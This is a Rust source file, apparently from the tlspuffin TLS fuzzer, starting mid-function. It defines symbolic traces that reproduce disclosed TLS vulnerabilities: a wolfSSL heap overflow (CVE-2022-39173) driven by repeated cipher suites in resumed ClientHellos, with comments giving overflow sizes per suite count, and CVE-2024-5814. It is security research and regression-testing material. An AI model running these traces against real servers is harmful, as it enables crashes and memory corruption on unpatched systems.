            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_serverhellodone,
                                fn_handshakepayload_serverhellodone
                            )
                        )
                    )
                }
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_clientkeyexchange,
                                fn_handshakepayload_clientkeyexchange(
                                    fn_payload(
                                        ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                                    )
                                )
                            )
                        )
                    )
                }
                                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_changecipherspec(fn_changecipherspecpayload)
                    )
                }
                }),
            },
            // Client Handshake Finished, Client -> Server
            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
            // not know that the Handshake record message is encrypted. The parsed message from the
            // could be a HelloRequest if the encrypted data starts with a 0.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    (client, 3)[None] > TypeShape::of::<OpaqueMessage>()
                }
                }),
            },
            // NewSessionTicket, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { last_term }),
            },
        ],
        ..Default::default()
    }
}

pub fn seed_cve_2022_39173(
    initial_server: AgentName,
    server: AgentName,
) -> Trace<TLSProtocolTypes> {
    let initial_handshake = seed_client_attacker(initial_server);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]),
            // Ticket from last session
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_psk(D(((initial_server, 0) / KeyShareEntry), Vec<u8>))),
            fn_no_psk,
            fn_namedgroup_secp384r1,
            fn_true,
            fn_seq_0,
            // sequence restarts at 0 because we are decrypting now traffic
            fn_random,
            fn_ciphersuite_tls13_aes_128_gcm_sha256
        )
    };

    let mut cipher_suites = term! {
        fn_list_ciphersuite_empty()
    };
    for _ in 0..149 {
        // also works with 149, 150 leads a too large list of suites (as expected)
        // Maximum reached suitesSz value depending on the number of ciphers in the list:
        // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
        // 14 -> suiteSz reaches 450 (overflow of 150 bytes)
        // 13 -> suiteSz reaches 392  (overflow of 92 bytes)
        // 12 -> suiteSz reaches 338  (overflow of 38 bytes)
        // 11 -> suiteSz remains below 300
        cipher_suites = term! {
            fn_list_ciphersuite_append(
                (@cipher_suites),
                fn_ciphersuite_tls13_aes_128_gcm_sha256 // For 5.5.0 this MUST be a supported cipher suite
                //fn_ciphersuite_tls_ecdhe_rsa_with_aes_128_gcm_sha256 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_clienthello,
                    fn_handshakepayload_clienthello(
                        fn_clienthellopayload(
                            fn_protocolversion_tlsv1_2,
                            fn_random,
                            fn_sessionid,
                            (fn_ciphersuites(
                                (fn_list_ciphersuite_append(
                                    (@cipher_suites),
                                    // CHANGED FROM: (fn_list_ciphersuite_empty()),
                                    // CHANGED FROM fn_ciphersuite_tls13_aes_128_gcm_sha256
                                    fn_ciphersuite_tls13_aes_256_gcm_sha384
                                ))
                            )),
                            fn_compressions(
                                fn_list_compression_append(
                                    fn_list_compression_empty,
                                    fn_compression_null
                                )
                            ),
                            (fn_clientextensions(
                                (fn_list_clientextension_append(
                                    (fn_list_clientextension_append(
                                        (fn_list_clientextension_append(
                                            (fn_list_clientextension_append(
                                                (fn_list_clientextension_append(
                                                    fn_list_clientextension_empty,
                                                    // CHANGED from: (fn_list_clientextension_append(
                                                    // CHANGED from:     fn_list_clientextension_empty,
                                                    // CHANGED from: )),
                                                    // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
                                                    (fn_clientextension_signaturealgorithms(
                                                        fn_supportedsignatureschemes(
                                                            (fn_list_signaturescheme_append(
                                                                (fn_list_signaturescheme_append(
                                                                    fn_list_signaturescheme_empty,
                                                                    fn_signaturescheme_rsa_pkcs1_sha256
                                                                )),
                                                                fn_signaturescheme_rsa_pss_sha256
                                                            ))
                                                        )
                                                    ))
                                                )),
                                                fn_clientextension_supportedversions(
                                                    fn_protocolversions(
                                                        fn_list_protocolversion_append(
                                                            fn_list_protocolversion_empty,
                                                            fn_protocolversion_tlsv1_3
                                                        )
                                                    )
                                                )
                                            )),
                                            (fn_clientextension_keyshare(
                                                fn_keyshareentries(
                                                    (fn_list_keyshareentry_append(
                                                        fn_list_keyshareentry_empty,
                                                        (fn_key_share_deterministic(
                                                            fn_namedgroup_secp384r1
                                                        ))
                                                    ))
                                                )
                                            ))
                                        )),
                                        fn_clientextension_presharedkeymodes(
                                            fn_pskkeyexchangemodes(
                                                fn_list_pskkeyexchangemode_append(
                                                    fn_list_pskkeyexchangemode_empty,
                                                    fn_pskkeyexchangemode_psk_dhe_ke
                                                )
                                            )
                                        )
                                    )),
                                    // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                                    // must be last in client_hello, and initially empty until filled by fn_fill_binder
                                    (fn_preshared_keys_extension_empty_binder((@new_ticket_message)))
                                ))
                            ))
                        )
                    )
                )
            )
        )
    };

    let psk = term! {
        fn_derive_psk(
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_client_finished_transcript(((initial_server, 0)))),
            (fn_psk(
                D(
                    ((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))] / KeyShareEntry),
                    Vec<u8>
                )
            )),
            (D((@new_ticket_message), Vec<u8>)),
            fn_namedgroup_secp384r1,
            fn_random,
            fn_ciphersuite_tls13_aes_128_gcm_sha256
        )
    };

    let binder = term! {
        fn_derive_binder((@client_hello), (@psk), fn_ciphersuite_tls13_aes_128_gcm_sha256)
    };

    let full_client_hello = term! {
        fn_fill_binder((@client_hello), (@binder))
    };

    Trace {
        // Step 1: Prior trace performs an initial TLS 1.3 session with a full handshake and
        // establishes a PSK, including Client Hello number 1 (`CH1`).
        prior_traces: vec![initial_handshake],
        descriptors: vec![TLSDescriptorConfig::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            // Step 2: sends a Client Hello (CH2) with a missing support_group_extension that will
            // make the server enters the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE`
            // and with PSK resuming previous session. CH2 includes a list of repeated
            // ciphers that will be stored in ssl->suites->suites.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    @full_client_hello
                }
                }),
            },
            // Step 3: sends a Client Hello (CH3) with a missing support_group_extension that will
            // keep the server in the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE` and
            // with PSK resuming previous session. CH3 includes a list of repeated
            // ciphers that will be matched against ssl->suites->suites.
            // Since ssl->suites->suites already contain repeated ciphers, the function
            // refineSuites in tls13.c will wrongly consider all pairs leading to an
            // explosion of sizeSz and the buffer overflow. Note: CH3 could also
            // include support_group_extension.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    @full_client_hello
                }
                }),
            },
        ],
        ..Default::default()
    }
}

pub fn seed_cve_2022_39173_full(
    initial_server: AgentName,
    server: AgentName,
) -> Trace<TLSProtocolTypes> {
    let (
        initial_handshake,
        server_hello_transcript,
        server_finished_transcript,
        client_finished_transcript,
    ) = _seed_client_attacker_full(initial_server);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]),
            // Ticket?
            (@server_hello_transcript),
            (@server_finished_transcript),
            (fn_psk(D(((initial_server, 0) / KeyShareEntry), Vec<u8>))),
            fn_no_psk,
            fn_namedgroup_secp384r1,
            fn_true,
            fn_seq_0,
            // sequence restarts at 0 because we are decrypting now traffic
            fn_random,
            fn_ciphersuite_tls13_aes_128_gcm_sha256
        )
    };

    let mut cipher_suites = term! {
        fn_list_ciphersuite_empty()
    };

    for _ in 0..149 {
        // 200 is too large already
        cipher_suites = term! {
            fn_list_ciphersuite_append(
                (@cipher_suites),
                fn_ciphersuite_tls13_aes_128_gcm_sha256 // For 5.5.0 this MUST be a supported cipher suite
                //fn_ciphersuite_tls_ecdhe_rsa_with_aes_128_gcm_sha256 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_clienthello,
                    fn_handshakepayload_clienthello(
                        fn_clienthellopayload(
                            fn_protocolversion_tlsv1_2,
                            fn_random,
                            fn_sessionid,
                            (fn_ciphersuites(
                                (fn_list_ciphersuite_append(
                                    (@cipher_suites),
                                    // CHANGED FROM: (fn_list_ciphersuite_empty()),
                                    fn_ciphersuite_tls13_aes_128_gcm_sha256
                                ))
                            )),
                            fn_compressions(
                                fn_list_compression_append(
                                    fn_list_compression_empty,
                                    fn_compression_null
                                )
                            ),
                            (fn_clientextensions(
                                (fn_list_clientextension_append(
                                    (fn_list_clientextension_append(
                                        (fn_list_clientextension_append(
                                            (fn_list_clientextension_append(
                                                (fn_list_clientextension_append(
                                                    fn_list_clientextension_empty,
                                                    // CHANGED from: (fn_list_clientextension_append(
                                                    // CHANGED from:     fn_list_clientextension_empty,
                                                    // CHANGED from: )),
                                                    (fn_clientextension_signaturealgorithms(
                                                        fn_supportedsignatureschemes(
                                                            (fn_list_signaturescheme_append(
                                                                (fn_list_signaturescheme_append(
                                                                    fn_list_signaturescheme_empty,
                                                                    fn_signaturescheme_rsa_pkcs1_sha256
                                                                )),
                                                                fn_signaturescheme_rsa_pss_sha256
                                                            ))
                                                        )
                                                    ))
                                                )),
                                                fn_clientextension_supportedversions(
                                                    fn_protocolversions(
                                                        fn_list_protocolversion_append(
                                                            fn_list_protocolversion_empty,
                                                            fn_protocolversion_tlsv1_3
                                                        )
                                                    )
                                                )
                                            )),
                                            (fn_clientextension_keyshare(
                                                fn_keyshareentries(
                                                    (fn_list_keyshareentry_append(
                                                        fn_list_keyshareentry_empty,
                                                        (fn_key_share_deterministic(
                                                            fn_namedgroup_secp384r1
                                                        ))
                                                    ))
                                                )
                                            ))
                                        )),
                                        fn_clientextension_presharedkeymodes(
                                            fn_pskkeyexchangemodes(
                                                fn_list_pskkeyexchangemode_append(
                                                    fn_list_pskkeyexchangemode_empty,
                                                    fn_pskkeyexchangemode_psk_dhe_ke
                                                )
                                            )
                                        )
                                    )),
                                    // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                                    // must be last in client_hello, and initially empty until filled by fn_fill_binder
                                    (fn_preshared_keys_extension_empty_binder((@new_ticket_message)))
                                ))
                            ))
                        )
                    )
                )
            )
        )
    };

    let psk = term! {
        fn_derive_psk(
            (@server_hello_transcript),
            (@server_finished_transcript),
            (@client_finished_transcript),
            (fn_psk(
                D(
                    ((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))] / KeyShareEntry),
                    Vec<u8>
                )
            )),
            (D((@new_ticket_message), Vec<u8>)),
            fn_namedgroup_secp384r1,
            fn_random,
            fn_ciphersuite_tls13_aes_128_gcm_sha256
        )
    };

    let binder = term! {
        fn_derive_binder((@client_hello), (@psk), fn_ciphersuite_tls13_aes_128_gcm_sha256)
    };

    let full_client_hello = term! {
        fn_fill_binder((@client_hello), (@binder))
    };

    Trace {
        prior_traces: vec![initial_handshake],
        descriptors: vec![TLSDescriptorConfig::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    @full_client_hello
                }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    @full_client_hello
                }
                }),
            },
        ],
        ..Default::default()
    }
}

pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TLSProtocolTypes> {
    // WAS REQUIRED: let initial_handshake = seed_client_attacker(initial_server);

    let new_ticket_message = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_newsessionticket,
                    fn_handshakepayload_newsessiontickettls13(
                        fn_newsessionticketpayloadtls13(
                            fn_u64_to_u32(fn_seq_10),
                            fn_u64_to_u32(fn_seq_12),
                            // DUMMY resumption ticket
                            (fn_payloadu8(fn_alice_cert)),
                            (fn_payloadu16(fn_alice_cert)),
                            (fn_newsessionticketextensions(fn_list_newsessionticketextension_empty))
                        )
                    )
                )
            )
        )
    };

    let mut cipher_suites = term! {
        fn_list_ciphersuite_empty()
    };
    for _ in 0..149 {
        // also works with 149, 150 leads a too large list of suites (as expected)
        // Maximum reached suitesSz value depending on the number of ciphers in the list:
        // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
        // 14 -> suiteSz reaches 450 (overflow of 150 bytes)
        // 13 -> suiteSz reaches 392  (overflow of 92 bytes)
        // 12 -> suiteSz reaches 338  (overflow of 38 bytes)
        // 11 -> suiteSz remains below 300
        cipher_suites = term! {
            fn_list_ciphersuite_append(
                (@cipher_suites),
                fn_ciphersuite_tls13_aes_256_gcm_sha384 // For 5.5.0 this MUST be a supported cipher suite
                //fn_ciphersuite_tls_ecdhe_rsa_with_aes_128_gcm_sha256 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_clienthello,
                    fn_handshakepayload_clienthello(
                        fn_clienthellopayload(
                            fn_protocolversion_tlsv1_2,
                            fn_random,
                            fn_sessionid,
                            (fn_ciphersuites(
                                (fn_list_ciphersuite_append(
                                    (@cipher_suites),
                                    // CHANGED FROM: (fn_list_ciphersuite_empty()),
                                    // CHANGED FROM fn_ciphersuite_tls13_aes_128_gcm_sha256
                                    fn_ciphersuite_tls13_aes_256_gcm_sha384
                                ))
                            )),
                            fn_compressions(
                                fn_list_compression_append(
                                    fn_list_compression_empty,
                                    fn_compression_null
                                )
                            ),
                            (fn_clientextensions(
                                (fn_list_clientextension_append(
                                    (fn_list_clientextension_append(
                                        (fn_list_clientextension_append(
                                            (fn_list_clientextension_append(
                                                (fn_list_clientextension_append(
                                                    fn_list_clientextension_empty,
                                                    // CHANGED from: (fn_list_clientextension_append(
                                                    // CHANGED from:     fn_list_clientextension_empty,
                                                    // CHANGED from: )),
                                                    // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
                                                    (fn_clientextension_signaturealgorithms(
                                                        fn_supportedsignatureschemes(
                                                            (fn_list_signaturescheme_append(
                                                                (fn_list_signaturescheme_append(
                                                                    fn_list_signaturescheme_empty,
                                                                    fn_signaturescheme_rsa_pkcs1_sha256
                                                                )),
                                                                fn_signaturescheme_rsa_pss_sha256
                                                            ))
                                                        )
                                                    ))
                                                )),
                                                fn_clientextension_supportedversions(
                                                    fn_protocolversions(
                                                        fn_list_protocolversion_append(
                                                            fn_list_protocolversion_empty,
                                                            fn_protocolversion_tlsv1_3
                                                        )
                                                    )
                                                )
                                            )),
                                            (fn_clientextension_keyshare(
                                                fn_keyshareentries(
                                                    (fn_list_keyshareentry_append(
                                                        fn_list_keyshareentry_empty,
                                                        (fn_key_share_deterministic(
                                                            fn_namedgroup_secp384r1
                                                        ))
                                                    ))
                                                )
                                            ))
                                        )),
                                        fn_clientextension_presharedkeymodes(
                                            fn_pskkeyexchangemodes(
                                                fn_list_pskkeyexchangemode_append(
                                                    fn_list_pskkeyexchangemode_empty,
                                                    fn_pskkeyexchangemode_psk_dhe_ke
                                                )
                                            )
                                        )
                                    )),
                                    // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                                    // must be last in client_hello, and initially empty until filled by fn_fill_binder
                                    (fn_preshared_keys_extension_empty_binder((@new_ticket_message)))
                                ))
                            ))
                        )
                    )
                )
            )
        )
    };

    Trace {
        // No more need for a prior trace and a full handshake.
        prior_traces: vec![], // WAS [initial_handshake],
        descriptors: vec![TLSDescriptorConfig::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    @client_hello
                }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    @client_hello
                }
                }),
            },
        ],
        ..Default::default()
    }
}

/// <https://nvd.nist.gov/vuln/detail/CVE-2024-5814>
pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
    let selected_cipher_suite = term! {
        fn_ciphersuite_tls_ecdhe_rsa_with_chacha20_poly1305_sha256
    };
    let server_hello = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_serverhello,
                    fn_handshakepayload_serverhello(
                        fn_serverhellopayload(
                            fn_protocolversion_tlsv1_2,
                            fn_random,
                            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
                            (@selected_cipher_suite),
                            // Using a cipher not in configuration cipher string
                            fn_compression_null,
                            (fn_serverextensions(
                                (fn_list_serverextension_append(
                                    fn_list_serverextension_empty,
                                    (fn_serverextension_renegotiationinfo(
                                        (fn_payloadu8(fn_empty_bytes_vec))
                                    ))
                                ))
                            ))
                        )
                    )
                )
            )
        )
    };

    let server_hello_transcript = term! {
        fn_append_transcript(
            (fn_append_transcript(
                fn_new_transcript12,
                ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]) // ClientHello
            )),
            (@server_hello) // plaintext ServerHello
        )
    };

    let server_certificate = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_certificate,
                    fn_handshakepayload_certificate(
                        fn_certificatepayload(
                            (fn_list_certificate_append(
                                fn_list_certificate_empty,
                                (fn_certificate(fn_alice_cert))
                            ))
                        )
                    )
                )
            )
        )
    };

    let certificate_transcript = term! {
        fn_append_transcript((@server_hello_transcript), (@server_certificate))
    };

    let server_key_exchange = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_serverkeyexchange,
                    fn_handshakepayload_serverkeyexchange(
                        fn_serverkeyexchangepayload_unknown(
                            fn_payload(
                                (fn_sign_rsa_ecdhe_server_key_exchange12(
                                    fn_namedgroup_secp384r1,
                                    ((client, 0)),
                                    fn_random,
                                    fn_alice_key
                                ))
                            )
                        )
                    )
                )
            )
        )
    };

    let server_key_exchange_transcript = term! {
        fn_append_transcript((@certificate_transcript), (@server_key_exchange))
    };

    let server_hello_done_transcript = term! {
        fn_append_transcript(
            (@server_key_exchange_transcript),
            (fn_message(
                fn_protocolversion_tlsv1_2,
                fn_messagepayload_handshake(
                    fn_handshakemessagepayload(
                        fn_handshaketype_serverhellodone,
                        fn_handshakepayload_serverhellodone
                    )
                )
            ))
        )
    };

    let client_key_exchange_transcript = term! {
        fn_append_transcript(
            (@server_hello_done_transcript),
            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))])
        )
    };

    let client_ecdh_pubkey = term! {
        fn_decode_client_ecdh_pubkey(
            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>) // ClientECDHParams
        )
    };

    let client_finished_transcript = term! {
        fn_append_transcript(
            (@client_key_exchange_transcript),
            (fn_decrypt12(
                // Decrypt client finished
                ((client, 0)[Some(TlsQueryMatcher::Handshake(None))]),
                //EncryptedHandshake
                fn_random,
                (@client_ecdh_pubkey),
                fn_namedgroup_secp384r1,
                fn_false,
                fn_seq_0,
                ((client, 0)),
                (@selected_cipher_suite)
            ))
        )
    };

    let server_verify_data = term! {
        fn_server_sign_transcript(
            fn_random,
            (@client_ecdh_pubkey),
            (@client_finished_transcript),
            fn_namedgroup_secp384r1,
            ((client, 0)),
            (@selected_cipher_suite)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![TLSDescriptorConfig::new_client(client, TLSVersion::Both)],
        steps: vec![
            // Client Hello, Client -> Server
            OutputAction::new_step(client),
            // Server Hello, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { server_hello
                }),
            },
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { server_certificate
                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { server_key_exchange
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_serverhellodone,
                                fn_handshakepayload_serverhellodone
                            )
                        )
                    )
                }
                }),
            },
            // Output messages from Client:
            // Client Key Exchange, Client -> Server
            // Client Change Cipher Spec, Client -> Server
            // Client Finished, Client -> Server

            // Server Change Cipher Spec, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_changecipherspec(fn_changecipherspecpayload)
                    )
                }
                }),
            },
            // Server Finished, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_encrypt12(
                        (fn_message(
                            fn_protocolversion_tlsv1_2,
                            fn_messagepayload_handshake(
                                fn_handshakemessagepayload(
                                    fn_handshaketype_finished,
                                    fn_handshakepayload_finished(fn_payload((@server_verify_data)))
                                )
                            )
                        )),
                        fn_random,
                        (@client_ecdh_pubkey),
                        fn_namedgroup_secp384r1,
                        fn_false,
                        fn_seq_0,
                        ((client, 0)),
                        (@selected_cipher_suite)
                    )
                }
                                }),
            },
        ],
        ..Default::default()
    }
}

#[cfg(test)]
pub mod tests {
    use puffin::algebra::TermType;
    use puffin::fuzzer::utils::TermConstraints;

    #[allow(unused_imports)]
    use crate::{test_utils::prelude::*, tls::vulnerabilities::*};

    #[test_log::test]
    fn test_term_sizes() {
        let client = AgentName::first();
        let _server = client.next();

        for (name, trace) in [
            seed_cve_2022_25638.build_named_trace(),
            seed_cve_2022_25640.build_named_trace(),
            seed_cve_2021_3449.build_named_trace(),
            // seed_heartbleed.build_named_trace(),
            seed_freak.build_named_trace(),
            seed_cve_2022_25640_simple.build_named_trace(),
            seed_cve_2022_38153.build_named_trace(),
            // TODO: 685 seed_cve_2022_39173.build_named_trace(),
            // TODO: 1695 seed_cve_2022_39173_full.build_named_trace(),
            // TODO: 322 seed_cve_2022_39173_minimized.build_named_trace(),
        ] {
            for step in &trace.steps {
                match &step.action {
                    Action::Input(input) => {
                        // should be below a certain threshold, else we should increase
                        // max_term_size in fuzzer setup
                        let terms = input.recipe.size();
                        assert!(
                            terms < TermConstraints::default().max_term_size_explore,
                            "{} has step with too large term size {}!",
                            name,
                            terms
                        );
                    }
                    Action::Output(_) => {}
                }
            }
        }
    }
}
